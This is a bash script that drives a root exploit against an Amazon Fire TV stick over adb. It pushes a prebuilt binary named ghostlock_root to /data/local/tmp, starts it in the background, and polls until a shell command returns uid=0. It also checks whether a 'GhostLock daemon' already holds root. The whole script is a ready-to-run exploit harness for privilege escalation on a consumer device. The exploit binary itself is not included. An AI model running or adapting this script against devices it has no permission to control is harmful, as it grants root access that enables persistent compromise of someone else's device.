#!/usr/bin/env bash
set -euo pipefail

HOST="${1:-}"
HERE="$(cd "$(dirname "$0")" && pwd)"
BIN="${BIN:-$HERE/../dist/libglroot.so}"

[ -n "$HOST" ] || { echo "usage: $0 <firestick-ip>:5555"; exit 1; }
[ -f "$BIN" ] || { echo "missing $BIN"; exit 1; }

ADB=(adb -s "$HOST")
"${ADB[@]}" get-state >/dev/null

if "${ADB[@]}" shell '/data/local/tmp/gl/su -c id' 2>/dev/null | grep -q 'uid=0'; then
    echo "already rooted; GhostLock daemon is running"
    "${ADB[@]}" shell '/data/local/tmp/gl/su -c id'
    exit 0
fi

"${ADB[@]}" shell 'mkdir -p /data/local/tmp/gl'
"${ADB[@]}" push "$BIN" /data/local/tmp/gl/ghostlock_root >/dev/null
"${ADB[@]}" shell 'chmod 755 /data/local/tmp/gl/ghostlock_root'

echo "[*] starting exploit"
"${ADB[@]}" shell 'setsid /data/local/tmp/gl/ghostlock_root --tries 6 >/data/local/tmp/gl-run.log 2>&1 < /dev/null &'

for _ in $(seq 1 90); do
    out="$("${ADB[@]}" shell '/data/local/tmp/gl/ghostlock_root --su -c id' 2>/dev/null || true)"
    if printf '%s' "$out" | grep -q 'uid=0'; then
        echo "$out"
        exit 0
    fi
    sleep 1
done

echo "root did not come up; last log:"
"${ADB[@]}" shell 'tail -40 /data/local/tmp/gl-run.log' || true
exit 1
